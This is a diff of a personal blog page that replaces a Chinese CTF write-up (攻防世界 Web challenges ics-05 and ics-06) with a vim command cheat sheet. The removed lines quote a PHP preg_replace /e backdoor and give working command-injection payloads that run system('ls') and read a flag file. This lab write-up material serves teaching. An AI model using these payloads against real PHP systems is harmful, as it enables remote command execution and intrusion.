@@ -3,31 +3,33 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>攻防世界Web - MINX&#39;s Blog</title>
+  <title>vim基础使用 - MINX&#39;s Blog</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
-  <meta name="description" content="攻防世界Web进阶部分Writeup">
+  <meta name="description" content="参考：https://www.cnblogs.com/Jimc/p/10213914.html（可以说是照搬吧，只是写给自己忘记的时候看看）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界Web">
-<meta property="og:url" content="http://iminx.cn/2019/10/30/攻防世界WP/index.html">
+<meta property="og:title" content="vim基础使用">
+<meta property="og:url" content="http://iminx.cn/2019/10/31/vim基础使用/index.html">
 <meta property="og:site_name" content="MINX&#39;s Blog">
-<meta property="og:description" content="攻防世界Web进阶部分Writeup">
+<meta property="og:description" content="参考：https://www.cnblogs.com/Jimc/p/10213914.html（可以说是照搬吧，只是写给自己忘记的时候看看）">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-30T16:11:23.021Z">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1.png">
+<meta property="og:updated_time" content="2019-10-31T16:37:59.201Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界Web">
-<meta name="twitter:description" content="攻防世界Web进阶部分Writeup">
+<meta name="twitter:title" content="vim基础使用">
+<meta name="twitter:description" content="参考：https://www.cnblogs.com/Jimc/p/10213914.html（可以说是照搬吧，只是写给自己忘记的时候看看）">
+<meta name="twitter:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1.png">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1580272697227">
+  <link rel="stylesheet" href="/css/style.css?v=1580272697224">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -139,36 +141,66 @@
         <div class="nexmoe-post">
     <div class="nexmoe-post-cover"> 
         
-        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/2.jpg">
+        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/12.jpg">
         
-        <h1>攻防世界Web</h1>
+        <h1>vim基础使用</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月30日</a>
-    <a><i class="nexmoefont icon-areachart"></i>258 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月31日</a>
+    <a><i class="nexmoefont icon-areachart"></i>778 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
     
-      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Linux基础命令/">Linux基础命令</a>
     
     
   </div>
   <article>
-    <p>攻防世界Web进阶部分Writeup</p>
+    <p>参考：<a href="https://www.cnblogs.com/Jimc/p/10213914.html" target="_blank" rel="noopener">https://www.cnblogs.com/Jimc/p/10213914.html</a><br>（可以说是照搬吧，只是写给自己忘记的时候看看）</p>
 <a id="more"></a>
-<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>hint：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统<br>所以直接进入设备维护中心，然后再点一下“云平台设备维护中心”，就可以发现有一个page参数，直接php伪协议读index.php，可以读到源码,其中关键部分：</p>
-<pre><code>//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
-if($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;){
-    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;
-    $pattern = $_GET[pat];
-    $replacement = $_GET[rep];
-    $subject = $_GET[sub];
-    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
-        preg_replace($pattern, $replacement, $subject);
-    }else{
-        die();
-    }
-}</code></pre><p>这里就比较明显了，就是用三个参数构造后门，这里考的是preg_replace的命令执行漏洞，payload<code>?pat=/test/e&amp;rep=system(&quot;ls&quot;)&amp;sub=jutst%20test</code><br>然后可以构造<code>?pat=/test/e&amp;rep=system(&quot;cd%20s3chahahaDir%26%26cd%20flag%26%26cat%20flag.php&quot;)&amp;sub=jutst%20test</code>读到flag</p>
-<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>一开始以为是sql注入，试了半天不行，看了WP才知道是爆破id，到2333时出flag？？？？</p>
+
+<h1 id="先是工作模式图"><a href="#先是工作模式图" class="headerlink" title="先是工作模式图"></a>先是工作模式图</h1><p><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1.png" alt="vim"></p>
+<h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p><code>vi test.txt  或者 vim test.txt 或者 touch test.txt</code></p>
+<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><ol>
+<li>x,X                          x为向后删除一个字符，X为先前删除一个字符</li>
+<li>nx(n代表数字)                 向后删除n个字符</li>
+<li>dd                           删除当前行</li>
+<li>D                            删除当前行所有字符，试成为空行</li>
+<li>ndd(n代表数字)                删除光标所在行的向下n列</li>
+<li>u                            恢复前一个动作(undo)</li>
+<li>ynj(n代表数字)                复制光标所在行向下n+1行</li>
+<li>dnj(n代表数字)                删除光标所在行向下n+1行</li>
+<li>p,P                          p为复制的数据粘贴在光标的下一行，P为复制的数据粘贴在光标的上一行</li>
+<li>H                            光标移动到当前屏幕最上方的那一行的第一个非空字符</li>
+<li>L                            光标移动到当前屏幕最下方的那一行的第一个非空字符</li>
+<li>G                            光标移动到该文章最后一行的第一个非空字符</li>
+<li>Ctrl+f                       屏幕向下翻一页</li>
+<li>Ctrl+b                       屏幕向上翻一页</li>
+<li>Ctrl+d                       屏幕向下翻半页</li>
+<li>Ctrl+u                       屏幕向上翻半页</li>
+</ol>
+<h3 id="进入输入模式"><a href="#进入输入模式" class="headerlink" title="进入输入模式"></a>进入输入模式</h3><ol>
+<li>i,I i是在光标所在字母的后面输入。I是在光标所在行的非空字符最前面开始输入</li>
+<li>a,A a是在光标所在的字母前面一个位置开始输入，也就是输入后光标所在的字母会在输入的文字后面，A是光标所在行末尾开始输入</li>
+<li>o,O o在光标所在行下一行首开始输入，O在光标所在行上一行行首开始输入</li>
+<li>r,R r为替换光标所在的哪一个字符，R为一直替换光标所值的文字直到推出</li>
+<li>Esc 推出，回到命令模式</li>
+</ol>
+<h3 id="输入-进入底部命令模式"><a href="#输入-进入底部命令模式" class="headerlink" title="输入:进入底部命令模式"></a>输入<code>:</code>进入底部命令模式</h3><ol>
+<li>/word 在光标之后找到word字符串  这时候n向下检索，N向上检索</li>
+<li>?word 在光标之前找到word字符串</li>
+<li>:s/word1/word2/g             在光标当前行查找word1，并替换成word2</li>
+<li>:n1,n2s/word1/word2/g  　　　 在第n1行与第n2行之间查找word1，并替换成word2</li>
+<li>:%s/word1/word2/g        　　 整个文章查找word1，并替换成word2</li>
+<li>:w                           将编辑的数据保存到硬盘文件中</li>
+<li>:w [filename]                将编辑后的数据保存到硬盘的另一个文件中</li>
+<li>:r [filename]                在编辑数据时，读入另一个文件中的数据，即将filename文件中的内容加到光标所在行下一行</li>
+<li>:wq或:x                      保存并退出</li>
+<li>:q                           退出，适用于未修改的文件</li>
+<li>:q!                          强制退出，适用于修改文件后不保存退出</li>
+<li>:set nu                      显示行号</li>
+<li>:set nonu                    取消行号</li>
+<li>:n1,n2 w [filename]          将n1到n2行的内容保存到名为filename的文件中</li>
+</ol>
 
   </article>
   
@@ -176,7 +208,7 @@ if($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;){
 <div class="nexmoe-post-copyright">
 <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
 <strong>本文作者：</strong>MINX<br>
-<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/30/攻防世界WP/" title="http://iminx.cn/2019/10/30/攻防世界WP/" target="_blank" rel="noopener">http://iminx.cn/2019/10/30/攻防世界WP/</a><br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/31/vim基础使用/" title="http://iminx.cn/2019/10/31/vim基础使用/" target="_blank" rel="noopener">http://iminx.cn/2019/10/31/vim基础使用/</a><br>
 
   <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
 
